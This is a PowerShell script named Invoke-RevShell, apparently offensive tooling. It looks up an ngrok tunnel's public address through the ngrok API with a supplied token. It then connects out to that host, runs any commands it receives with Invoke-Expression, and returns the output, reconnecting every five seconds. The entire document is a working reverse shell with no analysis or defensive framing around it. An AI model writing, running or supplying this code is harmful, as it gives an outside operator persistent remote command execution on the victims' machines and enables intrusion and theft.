[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12 -bor [Net.SecurityProtocolType]::Tls11 -bor [Net.SecurityProtocolType]::Tls;

function Invoke-RevShell {

    param(
        [Parameter(Mandatory=$true)]
        [string]$api
    )

    function remote() {
        try {
            $request = New-Object System.Net.WebClient;
            $address = "https://api.ngrok.com/tunnels"
            $request.Headers.add("Authorization","Bearer $api");
            $request.Headers.add("Ngrok-Version","2");
            $address = $request.DownloadString("$address");
            $address = ConvertFrom-Json $address
            $address = $address.'tunnels'.'public_url'
            $hosts = $address.replace('tcp://','').Split(':')[0]
            $ports =  $address.replace('tcp://','').Split(':')[1]
            return $hosts,$ports
        } catch {
            Write-Output $_.Exception.Message
        }
    }


    while($true) {
        try {
            $client = New-Object System.Net.Sockets.TCPClient(remote);
            Write-Output "Connections Success!"
            $stream = $client.GetStream();
            [byte[]]$bytes = 0..65535 | %{0};
            while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0) {
                $data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes, 0, $i);
                try {
                    $send = (iex $data 2>&1 | Out-String )
                } catch {
                    $send = $_.Exception.Message | Out-String
                }
                $sendback = $send + 'PS ' + (pwd).Path + '> ';
                $sendbyte = ([text.encoding]::ASCII).GetBytes($sendback);
                $stream.Write($sendbyte, 0, $sendbyte.Length);
                $stream.Flush();
            }
            $client.Close();
        } catch {
            Write-Output $_.Exception.Message
        }
        Start-Sleep 5
    }
}
